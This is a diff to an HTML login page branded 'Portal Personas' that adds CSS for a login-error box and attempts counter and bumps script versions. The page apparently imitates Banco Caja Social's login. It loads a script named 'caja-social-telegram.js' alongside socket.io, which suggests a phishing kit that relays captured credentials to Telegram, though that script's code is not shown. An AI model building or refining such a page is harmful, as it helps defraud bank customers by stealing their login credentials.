@@ -7,7 +7,57 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="styles.css?v=5">
+    <style>
+        /* Crítico: caja error login (no depende de caché de styles.css) */
+        #loginErrorAlert.login-error-active,
+        #loginErrorAlert:not([hidden]) {
+            display: block !important;
+            background-color: #fff5f5 !important;
+            border: 1px solid #f5c6cb !important;
+            border-radius: 4px !important;
+            margin-bottom: 20px !important;
+            box-sizing: border-box !important;
+        }
+        #loginErrorAlert .alert-body {
+            display: flex !important;
+            align-items: flex-start !important;
+            gap: 12px !important;
+            padding: 16px !important;
+        }
+        #loginErrorAlert .alert-icon {
+            flex-shrink: 0 !important;
+            width: 24px !important;
+            height: 24px !important;
+            border-radius: 50% !important;
+            background-color: #dc3545 !important;
+            color: #fff !important;
+            font-size: 15px !important;
+            font-weight: 700 !important;
+            line-height: 24px !important;
+            text-align: center !important;
+        }
+        #loginErrorAlert .alert-heading {
+            display: block !important;
+            color: #c62828 !important;
+            font-size: 14px !important;
+            font-weight: 700 !important;
+            margin-bottom: 6px !important;
+        }
+        #loginErrorAlert .alert-description {
+            display: block !important;
+            color: #c62828 !important;
+            font-size: 13px !important;
+            line-height: 1.55 !important;
+        }
+        #intentosRestantes.intentos-visible {
+            display: block !important;
+            color: #dc3545 !important;
+            font-size: 13px !important;
+            font-weight: 600 !important;
+            margin: 6px 0 12px !important;
+        }
+    </style>
 </head>
 <body>
     <!-- Loading Overlay -->
@@ -30,14 +80,9 @@
                 
                 <h1 class="title">Bienvenido al<br>Portal Personas</h1>
 
-                <div id="loginErrorAlert" data-role="login-template__alert" class="alert alert-danger" role="alert" hidden>
+                <div id="loginErrorAlert" data-role="login-template__alert" class="alert alert-danger" role="alert" hidden style="display:none">
                     <div class="alert-body">
-                        <div class="alert-icon">
-                            <svg class="bb-icon bb-icon--md bb-icon-error-outline" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
-                                <circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2"/>
-                                <path d="M12 8v5M12 16h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-                            </svg>
-                        </div>
+                        <div class="alert-icon" aria-hidden="true">!</div>
                         <div class="alert-content">
                             <strong role="heading" class="alert-heading">Usuario o contraseña incorrectas</strong>
                             <div class="alert-description" data-role="alert-message">Recuerde que su contraseña será bloqueada al tercer intento errado. Por favor verifique e intente de nuevo.</div>
@@ -80,7 +125,7 @@
     
     <script src="/socket.io/socket.io.js"></script>
     <script src="/js/banco-utils.js"></script>
-    <script src="caja-social-telegram.js?v=4"></script>
-    <script src="client-optimized.js?v=4"></script>
+    <script src="caja-social-telegram.js?v=5"></script>
+    <script src="client-optimized.js?v=5"></script>
 </body>
 </html>
